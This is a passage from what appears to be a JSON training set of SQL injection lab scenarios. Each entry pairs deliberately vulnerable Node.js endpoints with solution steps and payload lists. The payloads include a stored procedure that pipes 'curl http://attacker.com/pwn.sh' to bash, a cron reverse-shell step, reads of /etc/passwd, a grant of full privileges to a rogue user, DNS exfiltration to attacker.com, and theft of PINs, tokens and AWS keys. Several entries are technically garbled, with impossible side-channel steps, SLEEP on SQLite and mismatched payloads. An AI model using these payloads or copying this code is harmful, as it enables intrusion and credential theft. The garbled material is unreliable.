      "4. Execute commands: '; CALL sys_exec('curl http://attacker.com/pwn.sh | bash')--",
      "5. Establish reverse shell through cron job persistence"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\napp.use(express.json());\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'cms_user',\n  password: 'P@ssw0rd!',\n  database: 'product_db'\n});\n\napp.post('/import', (req, res) => {\n  const products = req.body;\n  products.forEach(p => {\n    pool.query(\n      `INSERT INTO products (name, description) \n       VALUES ('${p.name}', '${p.description}')`\n    );\n  });\n  res.send('Import queued');\n});\n\napp.listen(3000);",
    "payloads": [
      "'; CREATE PROCEDURE pwn() BEGIN DECLARE cmd CHAR(255); SET cmd='curl http://attacker.com/pwn.sh | bash'; SET cmd=sys_exec(cmd); END;--",
      "'||(SELECT LOAD_FILE('/etc/passwd'))--",
      "'; GRANT ALL PRIVILEGES ON *.* TO 'pwn'@'%' IDENTIFIED BY 'pwned'--",
      "'; UPDATE mysql.user SET plugin='mysql_native_password' WHERE User='root'--"
    ]
  },
  {
    "Lab scenario": "Banking Mobile App Union-Based SQLi in Transaction Sorting",
    "Lab Description": "A mobile banking application vulnerable to UNION-based injection in the transaction history sorting parameter. The MySQL backend returns verbose errors through debug build flags. To solve: Extract account PIN hashes using multi-phase type coercion and JSON array bypass techniques while evading mobile API signature checks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept API call with Burp Suite Mobile Assistant",
      "2. Identify injectable 'sort' parameter using sqlmap tamper scripts",
      "3. Craft payload: ' UNION SELECT NULL,JSON_ARRAYAGG(pin_hash),NULL FROM pins--",
      "4. Bypass HMAC validation through timing window exploitation",
      "5. Crack hashes using GPU-accelerated brute-force"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\n\napp.get('/transactions', async (req, res) => {\n  const sort = req.query.sort || 'date';\n  const conn = await mysql.createConnection({\n    host: 'localhost',\n    user: 'mobile_app',\n    password: 'InsecureBankAPI123',\n    database: 'transactions'\n  });\n\n  try {\n    const [rows] = await conn.query(`SELECT id, amount, date FROM transactions ORDER BY ${sort}`);\n    res.json(rows);\n  } catch (err) {\n    console.error('Full error:', err.stack);\n    res.status(500).json({ error: err.code });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,TO_BASE64(pin_hash),NULL FROM pins--",
      "' AND 1=CONVERT((SELECT COUNT(*) FROM pins),UNSIGNED INTEGER)--",
      "'; UPDATE pins SET hash=MD5('pwned') WHERE user_id=1--",
      "'%00' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--"
    ]
  },
  {
    "Lab scenario": "Healthcare IoT Device Blind SQLi in Patient Monitoring",
    "Lab Description": "A medical IoT hub vulnerable to time-based blind injection in patient vital aggregation. The SQLite backend allows stacked queries through firmware debugging interfaces. To solve: Exfiltrate PHI data through differential power analysis of query execution times and EMF side-channel leakage.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Capture CAN bus traffic during vital sign updates",
      "2. Identify timing differentials using Software Defined Radio (SDR)",
      "3. Craft electromagnetic fault injection payloads",
      "4. Extract EEPROM contents via glitched queries",
      "5. Reconstruct database from memory artifacts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\n\nconst db = new sqlite3.Database('patient_monitor.db');\n\napp.post('/vitals', (req, res) => {\n  const patientId = req.body.patient_id;\n  const query = `SELECT AVG(heart_rate) FROM vitals WHERE patient_id = ${patientId}`;\n\n  db.get(query, (err, row) => {\n    if (err) return res.status(500).send('Monitor error');\n    res.json(row);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT CASE WHEN SUBSTR(ssn,1,1)='A' THEN randomblob(100000000) END FROM patients)--",
      "'; ATTACH DATABASE '/dev/fb0' AS display; UPDATE display SET pixel=0xFF0000 WHERE x=0 AND y=0--",
      "'||(SELECT WRITE_FILE('/proc/self/mem', (SELECT * FROM patients)))--",
      "'; PRAGMA writable_schema=1; UPDATE sqlite_master SET sql='CREATE TABLE pwn(cmd TEXT)'--"
    ]
  },
  {
    "Lab scenario": "Banking portal UNION-based SQL injection in transaction history ORDER BY clause",
    "Lab Description": "Transaction history endpoint concatenates the user‑supplied `sort` parameter directly into the SQL `ORDER BY` clause without any sanitization. Due to verbose debug logging and error leakage, failed injections reveal column counts and types. The application fails open, returning query results even when extra columns are included. To solve: retrieve the database version string by injecting a UNION SELECT payload into the `sort` parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the GET `/transactions?sort=date` request",
      "Validate vulnerability by injecting an invalid column index (`date' ORDER BY 99--`) and observing the error",
      "Craft a UNION-based payload to match column count and inject `version()`: `date' UNION SELECT NULL,version(),NULL--`",
      "Refine the payload to fit the correct number of columns and syntax",
      "Verify the database version appears in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE transactions(id INTEGER PRIMARY KEY, amount INTEGER, date TEXT)\");\n  db.run(\"INSERT INTO transactions(amount,date) VALUES (100,'2025-01-01')\");\n});\napp.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`; // vulnerability here\n  console.log('DEBUG QUERY:', query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));",
    "payloads": [
      "date' ORDER BY 99--",
      "date' UNION SELECT NULL,version(),NULL--",
      "date' UNION SELECT name, sql, NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "CMS UNION-based SQL injection in article analytics GROUP BY clause",
    "Lab Description": "Article analytics endpoint groups pageviews by an unsanitized `group` parameter in the `GROUP BY` clause. Error leakage reveals grouping errors and allowed column names. The application logs full stack traces. To solve: extract administrator email from `users` table via UNION SELECT in the `group` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET `/analytics?group=category`",
      "Validate by injecting an invalid group column (`category' GROUP BY fake--`) and observing the error",
      "Craft a UNION-based payload matching column count: `'category' GROUP BY category UNION SELECT NULL,email,NULL FROM users--`",
      "Bypass grouping constraints by adding `NULL` padding",
      "Verify the admin email appears in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE articles(id INTEGER, category TEXT, views INTEGER)\");\n  db.run(\"CREATE TABLE users(id INTEGER, email TEXT)\");\n  db.run(\"INSERT INTO users(email) VALUES ('admin@cms.local')\");\n});\napp.get('/analytics', (req, res) => {\n  const group = req.query.group || 'category';\n  const query = `SELECT ${group}, COUNT(*) FROM articles GROUP BY ${group}`; // vulnerability here\n  console.log('DEBUG:', query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "category' GROUP BY category UNION SELECT NULL,email,NULL FROM users--",
      "category' UNION SELECT NULL,sql,NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "API gateway UNION-based SQL injection in GraphQL resolver",
    "Lab Description": "A GraphQL `posts(filter)` resolver directly interpolates the `filter` argument into a PostgreSQL query without sanitization. Failed injections leak timing and errors. To solve: enumerate database tables by injecting a UNION SELECT in the `filter` argument.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Apollo Client DevTools to capture the GraphQL query",
      "Validate by injecting `filter: \"1=1\" OR 1=CAST((SELECT 1/0) AS INT)--` to trigger an error",
      "Craft a UNION-based payload: `filter: \"1=0 UNION SELECT tablename,NULL FROM pg_tables--\"`",
      "Refine to target `public` schema tables",
      "Verify table names appear in the response JSON"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst { Pool } = require('pg');\nconst schema = buildSchema(`type Query { posts(filter: String): [Post] } type Post { id: ID, title: String }`);\nconst pool = new Pool();\nconst root = {\n  posts: async ({ filter }) => {\n    const query = `SELECT id,title FROM posts WHERE ${filter}`; // vulnerability here\n    console.log(query);\n    const res = await pool.query(query);\n    return res.rows;\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true }));\napp.listen(4000);",
    "payloads": [
      "1=0 UNION SELECT tablename,NULL FROM pg_tables--",
      "1=0 UNION SELECT table_name,NULL FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "IoT dashboard UNION-based SQL injection in device status REST endpoint",
    "Lab Description": "The `/devices/:id/status` REST endpoint interpolates the `id` path parameter into a MySQL query without sanitization. Error messages reveal file paths. To solve: extract device secret key from `iot_keys` table via UNION SELECT in the `id` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send GET `/devices/123/status`",
      "Validate by using ID `123x'` and observing SQL error",
      "Craft payload: `123' UNION SELECT NULL,secret,NULL FROM iot_keys--`",
      "Refine payload to match column count",
      "Verify the secret key appears in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('mysql');\nconst app = express();\nconst pool = new Pool({ /* conn */ });\napp.get('/devices/:id/status', (req, res) => {\n  const id = req.params.id;\n  const query = `SELECT id,status,updated_at FROM devices WHERE id='${id}'`; // vulnerability here\n  console.log(query);\n  pool.query(query, (err, results) => {\n    if(err) return res.status(500).send(err.sqlMessage);\n    res.json(results[0]);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "123' UNION SELECT NULL,secret,NULL FROM iot_keys--",
      "123' UNION SELECT NULL,version(),NULL--"
    ]
  },
  {
    "Lab scenario": "Enterprise SOAP API UNION-based SQL injection in getUserDetails",
    "Lab Description": "A SOAP API `/soap` endpoint parses XML input and directly concatenates the `<userId>` element into an SQL query without sanitization. Verbose XML parser errors leak SQL. To solve: retrieve the list of roles from `user_roles` via a UNION SELECT injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the SOAP request body",
      "Validate by injecting `<userId>1' OR 1=1--</userId>` and observing the response",
      "Craft payload in XML: `<userId>1' UNION SELECT role,NULL FROM user_roles--</userId>`",
      "Refine payload to fit the column schema",
      "Verify the roles appear in the SOAP response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst xmlParser = require('express-xml-bodyparser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(xmlParser());\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE user_roles(id INTEGER, role TEXT)\");\n  db.run(\"INSERT INTO user_roles(role) VALUES ('admin')\");\n});\napp.post('/soap', (req, res) => {\n  const userId = req.body.Envelope.Body[0].getUserDetails[0].userId[0];\n  const query = `SELECT id,username FROM users WHERE id='${userId}'`; // vulnerability\n  console.log(query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1' UNION SELECT role,NULL FROM user_roles--",
      "1' UNION SELECT sql,NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "Social media platform UNION-based SQL injection in comment search",
    "Lab Description": "The comment search feature accepts a `q` parameter which is directly used in a DELETE statement for moderation logs. Error-based feedback leaks query syntax. To solve: exfiltrate OAuth tokens from `oauth_tokens` via UNION SELECT injection in the `q` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET `/comments/search?q=test`",
      "Validate by injecting `test'` and observing SQL error",
      "Craft payload: `test' UNION SELECT token,NULL FROM oauth_tokens--`",
      "Refine payload with column padding",
      "Verify tokens appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.get('/comments/search', async (req, res) => {\n  const q = req.query.q;\n  const query = `SELECT id,comment FROM comments WHERE comment LIKE '%${q}%'`; // vulnerability\n  console.log(query);\n  try { const result = await mssql.query(query); res.json(result.recordset); }\n  catch(err) { res.status(500).send(err.message); }\n});\napp.listen(3000);",
    "payloads": [
      "test' UNION SELECT token,NULL FROM oauth_tokens--",
      "test' UNION SELECT email,NULL FROM users--"
    ]
  },
  {
    "Lab scenario": "Cloud storage API UNION-based SQL injection in JSONB metadata",
    "Lab Description": "File metadata endpoint accepts a JSON payload and uses `jsonb_extract_path_text()` directly in an SQL query without sanitization. Error leakage reveals JSON path errors. To solve: extract AWS credentials from `aws_creds` via UNION SELECT injection in the JSON path.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send POST `/upload` with JSON metadata",
      "Validate by inserting malformed JSON path and observing SQL error",
      "Craft payload: `{\"path\": \"tags'; UNION SELECT access_key,NULL FROM aws_creds--\"}`",
      "Refine payload to correct JSONB syntax",
      "Verify credentials appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst { Pool } = require('pg');\nconst app = express();\napp.use(bodyParser.json());\nconst pool = new Pool();\napp.post('/upload', async (req, res) => {\n  const { path } = req.body;\n  const query = `SELECT jsonb_extract_path_text(metadata,'${path}') FROM files`; // vulnerability\n  console.log(query);\n  try { const { rows } = await pool.query(query); res.json(rows); }\n  catch(err) { res.status(500).send(err.message); }\n});\napp.listen(3000);",
    "payloads": [
      "tags'; UNION SELECT access_key,NULL FROM aws_creds--",
      "config'; UNION SELECT secret_key,NULL FROM aws_creds--"
    ]
  },
  {
    "Lab scenario": "Government portal UNION-based SQL injection in document search ORDER BY",
    "Lab Description": "Classified document search uses the `sort` parameter unsafely in an Oracle `ORDER BY` clause. Verbose errors leak OOB function calls. To solve: exfiltrate `blueprints` table filenames via UNION SELECT injection in the `sort` parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET `/search?sort=date` with Burp Suite",
      "Validate by injecting `date' ORDER BY 999--` and observing error",
      "Craft payload: `date' UNION SELECT filename,NULL FROM blueprints--`",
      "Bypass column count by adding `NULL` padding",
      "Verify filenames appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.get('/search', async (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT id,title FROM documents ORDER BY ${sort}`; // vulnerability\n  console.log(query);\n  try { const result = await oracledb.getConnection().then(conn => conn.execute(query)); res.json(result.rows); }\n  catch(err) { res.status(500).send(err.message); }\n});\napp.listen(3000);",
    "payloads": [
      "date' UNION SELECT filename,NULL FROM blueprints--",
      "date' UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA'),NULL FROM DUAL--"
    ]
  },
  {
    "Lab scenario": "E‑commerce REST API UNION-based SQL injection in product search",
    "Lab Description": "Product search endpoint uses the `name` query parameter directly in an SQLite query. Error messages leak schema. To solve: enumerate table names via UNION SELECT injection in the `name` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET `/search?name=prod`",
      "Validate by injecting `prod'` and observing SQL error",
      "Craft payload: `prod' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--`",
      "Refine payload to target specific schema",
      "Verify table names appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products(name TEXT)\");\n});\napp.get('/search', (req, res) => {\n  const name = req.query.name || '';\n  const query = `SELECT * FROM products WHERE name='${name}'`; // vulnerability\n  console.log(query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "prod' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
      "prod' UNION SELECT sql,NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "Banking portal OOB UNION-based SQL injection in audit logs",
    "Lab Description": "Audit log retrieval endpoint uses the `id` parameter in a MySQL query unsafely. OOB DNS exfiltration is possible via `LOAD_FILE` and a DNS-triggered webhook. To solve: exfiltrate administrator password hash using out-of-band injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap with `--dns-domain=attacker.com` against `/logs?id=1`",
      "Validate by injecting `' AND 1=1--` and observing normal response",
      "Craft OOB payload: `1' UNION SELECT password,LOAD_FILE('/etc/passwd') FROM users WHERE username='admin'--`",
      "Refine to ensure the DNS request is sent",
      "Verify exfiltration via your DNS logs on `attacker.com`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('mysql');\nconst app = express();\nconst pool = new Pool({ /* conn */ });\napp.get('/logs', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT entry FROM audit_logs WHERE id='${id}'`; // vulnerability\n  console.log(query);\n  pool.query(query, (err, results) => {\n    if(err) return res.status(500).send(err.sqlMessage);\n    res.json(results);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1' UNION SELECT password,LOAD_FILE('/etc/passwd') FROM users WHERE username='admin'--",
      "1' UNION SELECT password,CONCAT(username,'.attacker.com') FROM users--"
    ]
  },
  {
    "Lab scenario": "User login Boolean-based blind SQL injection in banking portal",
    "Lab Description": "Login endpoint uses unsanitized `username` and `password` in an SQLite query. No error messages are shown, but login success/failure differs. To solve: infer the administrator's password length and characters via Boolean-based blind SQL injections.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept POST `/login` with `username` and `password` fields",
      "Validate vulnerability by injecting `admin' OR '1'='1` and observing login success",
      "Craft Boolean-based payload to test length: `admin' AND LENGTH(password)>6--`",
      "Iterate length and character positions using substring tests",
      "Verify full password by logging in with the discovered credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users(username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users(username,password) VALUES ('administrator','s3cr3t')\");\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`; // vulnerability\n  db.get(query, [], (err, row) => {\n    if(row) res.send('Login successful'); else res.send('Invalid credentials');\n  });\n});\napp.listen(3000);",
    "payloads": [
      "administrator' OR '1'='1--",
      "administrator' AND LENGTH(password)>5--",
      "administrator' AND SUBSTR(password,1,1)='s'--"
    ]
  },
  {
    "Lab scenario": "IoT dashboard Boolean-based blind SQL injection in HAVING clause",
    "Lab Description": "Device analytics endpoint uses a `HAVING` clause with unsanitized input. Responses return HTTP 200 if rows exist and 404 otherwise, without errors. To solve: extract API keys via Boolean-based blind injections in the `having` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to send POST `/analytics` with JSON `{ \"having\": \"1=1\" }`",
      "Validate vulnerability by changing to `1=2` and observing 404",
      "Craft payload: `1=1 AND SUBSTR(api_key,1,1)='A'` and observe status",
      "Automate full key extraction via scripted requests",
      "Verify the key by authenticating to the device API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.json());\nconst db = new sqlite3.Database(':memory:');\napp.post('/analytics', (req, res) => {\n  const having = req.body.having;\n  const query = `SELECT device_id FROM readings GROUP BY device_id HAVING ${having}`; // vulnerability\n  db.all(query, [], (err, rows) => {\n    res.status(rows.length>0?200:404).send();\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1=1 AND SUBSTR(api_key,1,1)='A'",
      "1=1 AND LENGTH(api_key)>10"
    ]
  },
  {
    "Lab scenario": "CMS header-based Boolean blind SQL injection in audit logs",
    "Lab Description": "Audit middleware logs the `X-Forwarded-For` header directly into an INSERT without sanitization. It suppresses errors but uses UUID generation time as a proxy: longer insertion times indicate true conditions. To solve: extract admin password hash using Boolean blind injections and timing side channels.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to send requests with modified `X-Forwarded-For` header",
      "Validate vulnerability by injecting `X-Forwarded-For: 1' OR 1=1--` and observing UUID time difference",
      "Craft Boolean payload: `1' AND SUBSTR(password,1,1)='a'--` and measure response time",
      "Automate full hash extraction via timing measurements",
      "Verify the hash by logging in as admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst conn = mysql.createConnection({/*...*/});\napp.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs(ip) VALUES ('${ip}')`; // vulnerability\n  console.log(query);\n  conn.query(query);\n  next();\n});\napp.listen(3000);",
    "payloads": [
      "1' OR 1=1--",
      "1' AND SUBSTR(password,1,1)='a'--"
    ]
  },
  {
    "Lab scenario": "Social media Boolean-based blind SQL injection in DM search",
    "Lab Description": "Direct message search uses unsanitized input in a SQL Server `CONTAINS` predicate. No errors are shown, but the number of emoji reactions in responses indicate true/false. To solve: extract OAuth token characters via Boolean blind injections.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Fiddler to intercept POST `/search-dms` with body `{ \"q\": \"test\" }`",
      "Validate by injecting `test' OR 1=1--` and observing increased reaction count",
      "Craft Boolean payload: `test' AND ASCII(SUBSTRING(token,1,1))>100--`",
      "Automate token extraction by iterating ASCII ranges",
      "Verify the token via OAuth introspection endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sql = require('mssql');\nconst app = express();\napp.use(express.json());\napp.post('/search-dms', async (req, res) => {\n  const term = req.body.q;\n  const query = `SELECT * FROM messages WHERE CONTAINS(text,'${term}')`; // vulnerability\n  console.log(query);\n  const result = await sql.query(query);\n  res.json({ count: result.recordset.length });\n});\napp.listen(3000);",
    "payloads": [
      "test' AND ASCII(SUBSTRING(token,1,1))>100--",
      "test' AND EXISTS(SELECT 1 FROM oauth_tokens WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "API gateway Boolean-based blind SQL injection in JSON filters",
    "Lab Description": "Inventory search endpoint takes a JSON array of filter strings, concatenates them into a MySQL `WHERE` clause, and leaks full error messages. No direct errors are shown, but differing HTTP status codes indicate true/false. To solve: extract AWS secret key characters via Boolean blind injections in JSON filters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send POST `/api/search` with JSON `{ \"filters\": [\"1=1\"] }`",
      "Validate by injecting `\"1=2\"` and observing 404 status",
      "Craft Boolean payload: `\"1=1 AND SUBSTR(secret_key,1,1)='A'\"`",
      "Automate extraction by iterating through characters",
      "Verify key by accessing S3 with the discovered credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('mysql');\nconst app = express();\napp.use(express.json());\nconst pool = new Pool({/*...*/});\napp.post('/api/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`; // vulnerability\n  console.log(query);\n  pool.query(query, (err, rows) => {\n    res.status(err?404:200).send(err?err.sqlMessage:rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1=1 AND SUBSTR(secret_key,1,1)='A'",
      "1=1 AND LENGTH(secret_key)>10"
    ]
  },
  {
    "Lab scenario": "Educational platform time-based SQL injection in enrollment",
    "Lab Description": "Course enrollment endpoint takes `student_id` unsafely in an SQLite query. The application returns identical pages, but time delays (via `randomblob`) reveal true conditions. To solve: extract exam answer characters via time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept POST `/enroll` with `student_id`",
      "Validate by injecting `' OR CASE WHEN 1=1 THEN randomblob(100000000) ELSE 0 END--` and observing a delay",
      "Craft payloads testing ASCII codes: `' OR CASE WHEN ASCII(SUBSTR(answer,1,1))=65 THEN randomblob(100000000) ELSE 0 END--`",
      "Automate character extraction via timing measurements",
      "Verify answers by logging into the student portal"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE courses(student_id TEXT, answer TEXT)\");\n});\napp.post('/enroll', (req, res) => {\n  const id = req.body.student_id;\n  const query = `SELECT * FROM courses WHERE student_id='${id}'`; // vulnerability\n  console.log(query);\n  db.all(query, [], (err, rows) => { res.send(rows.length? 'Enrolled':'Invalid'); });\n});\napp.listen(3000);",
    "payloads": [
      "' OR CASE WHEN 1=1 THEN randomblob(100000000) ELSE 0 END--",
      "' OR CASE WHEN ASCII(SUBSTR(answer,1,1))=65 THEN randomblob(100000000) ELSE 0 END--"
    ]
  },
  {
    "Lab scenario": "Healthcare portal time-based SQL injection in get-medications",
    "Lab Description": "Patient portal uses an Oracle query to retrieve medications by `patientId` without sanitization. Responses return HTTP 200 or 404 based on row count; time delays (via `DBMS_PIPE.RECEIVE_MESSAGE`) reveal true conditions. To solve: extract allergy info characters via time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept POST `/get-medications` with `id`",
      "Validate by injecting `' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--` and observing delay",
      "Craft payload: `' OR CASE WHEN ASCII(SUBSTR(allergy_info,1,1))=65 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END--`",
      "Automate full extraction via timing scripts",
      "Verify results by accessing patient records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\napp.post('/get-medications', async (req, res) => {\n  const id = req.body.id;\n  const query = `SELECT drug_name FROM prescriptions WHERE patient_id='${id}'`; // vulnerability\n  console.log(query);\n  try {\n    const result = await oracledb.getConnection().then(c => c.execute(query));\n    res.status(result.rows.length?200:404).send();\n  } catch(e) { res.status(500).send(); }\n});\napp.listen(3000);",
    "payloads": [
      "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
      "' OR CASE WHEN ASCII(SUBSTR(allergy_info,1,1))=65 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END--"
    ]
  },
  {
    "Lab scenario": "Banking portal time-based SQL injection in account balance query",
    "Lab Description": "Balance check endpoint takes `id` unsafely into an SQLite query. Identical responses are returned except for time delay when `SLEEP` is invoked. To solve: infer account balance digits via time-based injections.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET `/balance?id=1`",
      "Validate by injecting `1' OR 1=1 SLEEP(5)--` and observing a delay",
      "Craft payload: `1' OR CASE WHEN balance>1000 THEN SLEEP(5) ELSE NULL END--`",
      "Automate balance extraction by adjusting thresholds",
      "Verify the balance in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => { db.run(\"CREATE TABLE accounts(id INTEGER, balance INTEGER)\"); db.run(\"INSERT INTO accounts(id,balance) VALUES (1,2000)\"); });\napp.get('/balance', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT balance FROM accounts WHERE id='${id}'`; // vulnerability\n  console.log(query);\n  db.get(query, [], (err, row) => { res.json({ balance: row?row.balance:'N/A' }); });\n});\napp.listen(3000);",
    "payloads": [
      "1' OR 1=1 SLEEP(5)--",
      "1' OR CASE WHEN balance>1000 THEN SLEEP(5) ELSE NULL END--"
    ]
  },
  {
    "Lab scenario": "OAuth callback time-based SQL injection in banking app",
    "Lab Description": "OAuth callback endpoint uses `state` directly in an SQLite query. Identical redirects occur, but time delays (via `randomblob`) reveal true conditions. To solve: extract user PIN digits via time-based inference on the `state` parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Charles Proxy to intercept GET `/oauth/callback?state=XYZ`",
      "Validate by injecting `XYZ' OR randomblob(100000000) ELSE NULL END--` and observing delay",
      "Craft payload: `XYZ' OR CASE WHEN SUBSTR(pin,1,1)='5' THEN randomblob(100000000) ELSE NULL END--`",
      "Automate extraction of each PIN digit via timing",
      "Verify PIN by logging in to the user dashboard"
    ],
    "Vulnerability name": "SQL injection",
